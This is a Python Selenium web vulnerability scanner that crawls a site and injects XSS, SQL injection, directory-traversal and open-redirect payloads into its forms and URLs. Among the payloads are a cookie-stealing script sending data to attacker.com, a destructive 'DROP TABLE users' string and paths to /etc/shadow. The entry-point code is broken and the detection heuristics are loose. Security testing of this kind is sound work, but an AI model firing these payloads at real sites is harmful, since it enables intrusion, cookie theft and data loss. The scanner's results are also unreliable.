from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from tests.base_test import BaseTest
import config
import time
import logging
import requests
from urllib.parse import urljoin, urlparse
import re
import json
from collections import deque
import undetected_chromedriver as uc

class SecurityTest(BaseTest):
    def __init__(self):
        super().__init__()
        self.vulnerabilities = []
        self.visited = set()
        self.setup_logging()
        self.session = requests.Session()
        self.report = []
        # Use undetected-chromedriver for automatic Chrome download
        options = uc.ChromeOptions()
        if config.HEADLESS:
            options.add_argument("--headless")
        self.driver = uc.Chrome(options=options)

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            filename='security_scan.log'
        )
        self.logger = logging.getLogger(__name__)

    def crawl_website(self, base_url, max_pages=30, max_depth=2):
        """Crawl all internal links up to max_pages and max_depth"""
        queue = deque()
        queue.append((base_url, 0))
        self.visited = set()
        found_pages = []
        domain = urlparse(base_url).netloc
        while queue and len(self.visited) < max_pages:
            url, depth = queue.popleft()
            if url in self.visited or depth > max_depth:
                continue
            self.visited.add(url)
            found_pages.append(url)
            try:
                self.driver.get(url)
                time.sleep(1)
                links = self.driver.find_elements(By.TAG_NAME, "a")
                for link in links:
                    href = link.get_attribute("href")
                    if href and urlparse(href).netloc == domain and href not in self.visited:
                        queue.append((href, depth + 1))
            except Exception as e:
                self.logger.error(f"Crawl error at {url}: {str(e)}")
        return found_pages

    def scan_page(self, url):
        """Scan a single page for vulnerabilities"""
        page_vulns = []
        self.driver.get(url)
        time.sleep(1)
        # Scan all forms
        forms = self.driver.find_elements(By.TAG_NAME, "form")
        for form in forms:
            form_vulns = self.scan_form(url, form)
            page_vulns.extend(form_vulns)
        # Run other checks
        self.check_csrf(url, page_vulns)
        self.check_cookie_security(url, page_vulns)
        self.check_directory_listing(url, page_vulns)
        # Run existing checks
        self.check_xss_vulnerability(url)
        self.check_sql_injection(url)
        self.check_clickjacking(url)
        self.check_ssl_tls(url)
        self.check_directory_traversal(url)
        self.check_open_redirect(url)
        # Collect vulnerabilities
        page_vulns.extend(self.vulnerabilities)
        self.vulnerabilities = []
        self.report.append({"url": url, "vulnerabilities": page_vulns})
        return page_vulns

    def scan_form(self, url, form):
        """Scan a form for XSS, SQLi, and CSRF"""
        vulns = []
        try:
            inputs = form.find_elements(By.TAG_NAME, "input")
            textareas = form.find_elements(By.TAG_NAME, "textarea")
            all_fields = inputs + textareas
            # XSS/SQLi payloads
            xss_payload = "<script>alert('XSS')</script>"
            sqli_payload = "' OR '1'='1"
            for field in all_fields:
                field_type = field.get_attribute("type")
                if field_type in ["text", "search", "email", "url", "tel", None] or field.tag_name == "textarea":
                    # XSS
                    try:
                        field.clear()
                        field.send_keys(xss_payload)
                        field.send_keys(Keys.RETURN)
                        time.sleep(1)
                        if xss_payload in self.driver.page_source:
                            vulns.append({
                                "type": "XSS (Form)",
                                "location": field.get_attribute("name") or field.get_attribute("id"),
                                "payload": xss_payload,
                                "severity": "High",
                                "details": "XSS payload reflected in form response"
                            })
                    except:
                        pass
                    # SQLi
                    try:
                        field.clear()
                        field.send_keys(sqli_payload)
                        field.send_keys(Keys.RETURN)
                        time.sleep(1)
                        error_keywords = ["SQL", "mysql", "syntax", "error", "ORA-", "SQLite"]
                        page_source = self.driver.page_source.lower()
                        if any(keyword.lower() in page_source for keyword in error_keywords):
                            vulns.append({
                                "type": "SQL Injection (Form)",
                                "location": field.get_attribute("name") or field.get_attribute("id"),
                                "payload": sqli_payload,
                                "severity": "Critical",
                                "details": "SQL error message detected in form"
                            })
                    except:
                        pass
        except Exception as e:
            self.logger.error(f"Form scan error at {url}: {str(e)}")
        return vulns

    def check_csrf(self, url, vulns):
        """Check for missing CSRF tokens in forms"""
        try:
            forms = self.driver.find_elements(By.TAG_NAME, "form")
            for form in forms:
                has_token = False
                inputs = form.find_elements(By.TAG_NAME, "input")
                for field in inputs:
                    name = field.get_attribute("name")
                    if name and ("csrf" in name.lower() or "token" in name.lower()):
                        has_token = True
                if not has_token:
                    vulns.append({
                        "type": "CSRF",
                        "location": url,
                        "severity": "High",
                        "details": "Form missing CSRF token input"
                    })
        except Exception as e:
            self.logger.error(f"CSRF check error at {url}: {str(e)}")

    def check_cookie_security(self, url, vulns):
        """Check for HttpOnly and Secure flags on cookies"""
        try:
            cookies = self.driver.get_cookies()
            for cookie in cookies:
                if not cookie.get("secure", False):
                    vulns.append({
                        "type": "Cookie Security",
                        "location": url,
                        "severity": "Medium",
                        "details": f"Cookie {cookie['name']} missing Secure flag"
                    })
                if not cookie.get("httpOnly", False):
                    vulns.append({
                        "type": "Cookie Security",
                        "location": url,
                        "severity": "Medium",
                        "details": f"Cookie {cookie['name']} missing HttpOnly flag"
                    })
        except Exception as e:
            self.logger.error(f"Cookie check error at {url}: {str(e)}")

    def check_directory_listing(self, url, vulns):
        """Check if directory listing is enabled"""
        try:
            self.driver.get(url)
            time.sleep(1)
            if re.search(r'<title>Index of', self.driver.page_source, re.IGNORECASE):
                vulns.append({
                    "type": "Directory Listing",
                    "location": url,
                    "severity": "Medium",
                    "details": "Directory listing appears to be enabled"
                })
        except Exception as e:
            self.logger.error(f"Directory listing check error at {url}: {str(e)}")

    def check_xss_vulnerability(self, url):
        """Check for XSS vulnerabilities"""
        try:
            self.driver.get(url)
            # Enhanced XSS payloads with more variations
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg/onload=alert('XSS')>",
                "'-alert(1)-'",
                "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<svg><script>alert('XSS')</script></svg>",
                "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
                "<marquee onstart=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<div onmouseover=alert('XSS')>",
                "<img src=x onerror=alert('XSS') onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<isindex onfocus=alert('XSS') autofocus>"
            ]
            
            # Find all input fields, textareas, and contenteditable elements
            input_fields = self.driver.find_elements(By.TAG_NAME, "input")
            textareas = self.driver.find_elements(By.TAG_NAME, "textarea")
            content_editables = self.driver.find_elements(By.CSS_SELECTOR, "[contenteditable='true']")
            all_fields = input_fields + textareas + content_editables

            # Also check URL parameters
            parsed_url = urlparse(url)
            if parsed_url.query:
                for payload in xss_payloads:
                    test_url = url.replace(parsed_url.query, f"{parsed_url.query}{payload}")
                    self.driver.get(test_url)
                    time.sleep(2)
                    if payload in self.driver.page_source:
                        self.vulnerabilities.append({
                            "type": "XSS (URL Parameter)",
                            "location": "URL Parameter",
                            "payload": payload,
                            "severity": "High",
                            "details": "XSS payload reflected in URL parameter"
                        })

            for field in all_fields:
                field_type = field.get_attribute("type")
                if field_type in ["text", "search", "email", "url", "tel", None] or field.tag_name == "textarea":
                    for payload in xss_payloads:
                        try:
                            field.clear()
                            field.send_keys(payload)
                            field.send_keys(Keys.RETURN)
                            time.sleep(2)
                            
                            # Check for reflected XSS
                            if payload in self.driver.page_source:
                                self.vulnerabilities.append({
                                    "type": "XSS (Reflected)",
                                    "location": field.get_attribute("name") or field.get_attribute("id"),
                                    "payload": payload,
                                    "severity": "High",
                                    "details": "XSS payload reflected in response"
                                })
                            
                            # Check for stored XSS
                            self.driver.refresh()
                            if payload in self.driver.page_source:
                                self.vulnerabilities.append({
                                    "type": "XSS (Stored)",
                                    "location": field.get_attribute("name") or field.get_attribute("id"),
                                    "payload": payload,
                                    "severity": "Critical",
                                    "details": "XSS payload persisted in response"
                                })
                        except:
                            continue
        except Exception as e:
            self.logger.error(f"Error in XSS check: {str(e)}")

    def check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        try:
            self.driver.get(url)
            # Enhanced SQL injection payloads
            sql_payloads = [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users; --",
                "' OR 1=1; --",
                "' OR 'x'='x",
                "admin' --",
                "admin' #",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "' OR '1'='1'/*",
                "') OR (('1'='1",
                "')) OR (('1'='1",
                "')) OR (('1'='1' --",
                "')) OR (('1'='1' #",
                "')) OR (('1'='1'/*",
                "1' ORDER BY 1--",
                "1' ORDER BY 2--",
                "1' ORDER BY 3--",
                "1' UNION SELECT NULL--",
                "1' UNION SELECT NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1' AND 1=1#",
                "1' AND 1=2#",
                "1' AND '1'='1#",
                "1' AND '1'='2#"
            ]
            
            input_fields = self.driver.find_elements(By.TAG_NAME, "input")
            for field in input_fields:
                field_type = field.get_attribute("type")
                if field_type in ["text", "search", "email", "url", "tel", None]:
                    for payload in sql_payloads:
                        try:
                            field.clear()
                            field.send_keys(payload)
                            field.send_keys(Keys.RETURN)
                            time.sleep(2)
                            
                            # Enhanced error detection
                            error_keywords = [
                                "SQL", "mysql", "syntax", "error", "ORA-", "SQLite",
                                "PostgreSQL", "SQL Server", "MariaDB", "ODBC",
                                "syntax error", "unexpected end", "unclosed quotation",
                                "invalid syntax", "unterminated quoted string",
                                "mysql_fetch_array", "mysql_fetch_assoc", "mysql_fetch_row",
                                "mysql_num_rows", "mysql_result", "mysql_query",
                                "pg_query", "pg_fetch_array", "pg_fetch_assoc",
                                "pg_fetch_row", "pg_num_rows", "pg_result",
                                "sqlite_query", "sqlite_fetch_array", "sqlite_fetch_assoc",
                                "sqlite_fetch_row", "sqlite_num_rows", "sqlite_result"
                            ]
                            page_source = self.driver.page_source.lower()
                            
                            # Check for SQL errors
                            if any(keyword.lower() in page_source for keyword in error_keywords):
                                self.vulnerabilities.append({
                                    "type": "SQL Injection",
                                    "location": field.get_attribute("name") or field.get_attribute("id"),
                                    "payload": payload,
                                    "severity": "Critical",
                                    "details": "SQL error message detected"
                                })
                            
                            # Check for successful injection
                            if any(keyword in page_source for keyword in ["admin", "user", "password", "login", "username", "email", "id", "role"]):
                                self.vulnerabilities.append({
                                    "type": "SQL Injection (Potential)",
                                    "location": field.get_attribute("name") or field.get_attribute("id"),
                                    "payload": payload,
                                    "severity": "High",
                                    "details": "Possible successful injection detected"
                                })
                        except:
                            continue
        except Exception as e:
            self.logger.error(f"Error in SQL injection check: {str(e)}")

    def check_clickjacking(self, url):
        """Check for clickjacking vulnerability"""
        try:
            self.driver.get(url)
            # Check for X-Frame-Options header
            headers = self.driver.execute_script("""
                var req = new XMLHttpRequest();
                req.open('GET', document.location, false);
                req.send(null);
                return req.getAllResponseHeaders();
            """)
            
            security_headers = {
                "X-Frame-Options": "Missing X-Frame-Options header",
                "Content-Security-Policy": "Missing Content-Security-Policy header",
                "X-Content-Type-Options": "Missing X-Content-Type-Options header",
                "X-XSS-Protection": "Missing X-XSS-Protection header",
                "Strict-Transport-Security": "Missing HSTS header",
                "Referrer-Policy": "Missing Referrer-Policy header",
                "Permissions-Policy": "Missing Permissions-Policy header",
                "Cross-Origin-Opener-Policy": "Missing Cross-Origin-Opener-Policy header",
                "Cross-Origin-Embedder-Policy": "Missing Cross-Origin-Embedder-Policy header",
                "Cross-Origin-Resource-Policy": "Missing Cross-Origin-Resource-Policy header"
            }
            
            for header, message in security_headers.items():
                if header not in headers:
                    self.vulnerabilities.append({
                        "type": "Security Headers",
                        "details": message,
                        "severity": "Medium"
                    })
        except Exception as e:
            self.logger.error(f"Error in clickjacking check: {str(e)}")

    def check_ssl_tls(self, url):
        """Check for SSL/TLS configuration"""
        try:
            if not url.startswith('https://'):
                self.vulnerabilities.append({
                    "type": "SSL/TLS",
                    "details": "Website not using HTTPS",
                    "severity": "High"
                })
            else:
                # Check SSL certificate
                try:
                    response = self.session.get(url, verify=True)
                    if response.status_code == 200:
                        cert = response.raw.connection.sock.getpeercert()
                        # Check certificate expiration
                        if cert and 'notAfter' in cert:
                            self.vulnerabilities.append({
                                "type": "SSL/TLS",
                                "details": f"Certificate valid until: {cert['notAfter']}",
                                "severity": "Info"
                            })
                except requests.exceptions.SSLError:
                    self.vulnerabilities.append({
                        "type": "SSL/TLS",
                        "details": "Invalid SSL certificate",
                        "severity": "High"
                    })
        except Exception as e:
            self.logger.error(f"Error in SSL/TLS check: {str(e)}")

    def check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        try:
            traversal_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%252f..%252f..%252fetc%252fshadow",
                "..%252f..%252f..%252fetc%252fgroup",
                "..%252f..%252f..%252fetc%252fhosts",
                "..%252f..%252f..%252fetc%252fservices",
                "..%252f..%252f..%252fetc%252fnetworks",
                "..%252f..%252f..%252fetc%252fprotocols",
                "..%252f..%252f..%252fetc%252fhostname",
                "..%252f..%252f..%252fetc%252fresolv.conf",
                "..%252f..%252f..%252fetc%252fprofile",
                "..%252f..%252f..%252fetc%252fpasswd~",
                "..%252f..%252f..%252fetc%252fshadow~",
                "..%252f..%252f..%252fetc%252fgroup~"
            ]
            
            for payload in traversal_payloads:
                test_url = urljoin(url, payload)
                self.driver.get(test_url)
                time.sleep(2)
                
                # Check for sensitive file content
                sensitive_keywords = [
                    "root:", "bin:", "daemon:", "[fonts]", "[extensions]",
                    "nobody:", "system:", "admin:", "user:", "password:",
                    "mysql:", "postgres:", "oracle:", "apache:", "nginx:",
                    "www-data:", "httpd:", "www:", "web:", "ftp:",
                    "mail:", "smtp:", "pop:", "imap:", "nntp:",
                    "news:", "uucp:", "operator:", "games:", "gopher:",
                    "nfsnobody:", "nscd:", "ldap:", "radius:", "radvd:",
                    "rpc:", "rpcuser:", "nfs:", "nobody:", "nobody4:",
                    "nobody6:", "nobody8:", "nobody9:", "nobody10:",
                    "nobody11:", "nobody12:", "nobody13:", "nobody14:",
                    "nobody15:", "nobody16:", "nobody17:", "nobody18:",
                    "nobody19:", "nobody20:", "nobody21:", "nobody22:",
                    "nobody23:", "nobody24:", "nobody25:", "nobody26:",
                    "nobody27:", "nobody28:", "nobody29:", "nobody30:"
                ]
                page_source = self.driver.page_source.lower()
                
                if any(keyword in page_source for keyword in sensitive_keywords):
                    self.vulnerabilities.append({
                        "type": "Directory Traversal",
                        "payload": payload,
                        "severity": "Critical",
                        "details": "Possible sensitive file access"
                    })
        except Exception as e:
            self.logger.error(f"Error in directory traversal check: {str(e)}")

    def check_open_redirect(self, url):
        """Check for open redirect vulnerabilities"""
        try:
            redirect_payloads = [
                "//google.com",
                "//google.com%2f%2e%2e",
                "//google%00.com",
                "//google.com%5c%2e%2e",
                "//google.com%2f%2e%2e%2f%2e%2e",
                "//google.com%252f%252e%252e",
                "//google.com%252f%252e%252e%252f%252e%252e",
                "//google.com%252f%252e%252e%252f%252e%252e%252f%252e%252e",
                "//google.com%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e",
                "//google.com%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e"
            ]
            
            for payload in redirect_payloads:
                test_url = urljoin(url, f"redirect?url={payload}")
                self.driver.get(test_url)
                time.sleep(2)
                
                if "google.com" in self.driver.current_url:
                    self.vulnerabilities.append({
                        "type": "Open Redirect",
                        "payload": payload,
                        "severity": "Medium",
                        "details": "Possible open redirect vulnerability"
                    })
        except Exception as e:
            self.logger.error(f"Error in open redirect check: {str(e)}")

    def run_security_scan(self, url, max_pages=30, max_depth=2):
        """Crawl and scan the website, output JSON report"""
        self.logger.info(f"Starting security scan for: {url}")
        pages = self.crawl_website(url, max_pages=max_pages, max_depth=max_depth)
        for page in pages:
            print(f"Scanning: {page}")
            self.scan_page(page)
        # Save JSON report
        with open('security_report.json', 'w', encoding='utf-8') as f:
            json.dump(self.report, f, indent=2)
        print(f"\nScan complete. Detailed report saved to security_report.json.")
        self.logger.info("Security scan completed")
        return self.report

    def close(self):
        if hasattr(self, 'driver'):
            self.driver.quit()

if __name__ == "__main__":
    try:
        main()
    finally:
        security_test.close() 